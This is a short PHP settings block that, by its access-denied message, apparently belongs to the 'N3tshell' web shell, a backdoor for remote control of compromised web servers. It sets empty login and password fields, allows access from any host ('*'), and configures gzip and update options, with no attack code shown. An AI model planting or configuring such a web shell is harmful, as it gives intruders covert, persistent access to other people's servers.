<?php
$login = ""; //login
//DON'T FORGOT ABOUT PASSWORD!!!
$pass = ""; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = " N3tshell v. ".$shver.": access denied";

$gzipencode = TRUE; //Encode with gzip?

$updatenow = FALSE; //If TRUE, update now (this variable will be FALSE)
?>